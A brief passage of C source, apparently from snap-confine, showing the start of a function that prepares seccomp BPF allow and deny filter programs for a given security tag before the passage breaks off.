   198	bool sc_apply_seccomp_profile_for_security_tag(const char *security_tag) {
   199	    debug("loading bpf program for security tag %s", security_tag);
   200	
   201	    char profile_path[PATH_MAX] = {0};
   202	    struct sock_fprog SC_CLEANUP(sc_cleanup_sock_fprog) prog_allow = {0};
   203	    struct sock_fprog SC_CLEANUP(sc_cleanup_sock_fprog) prog_deny = {0};
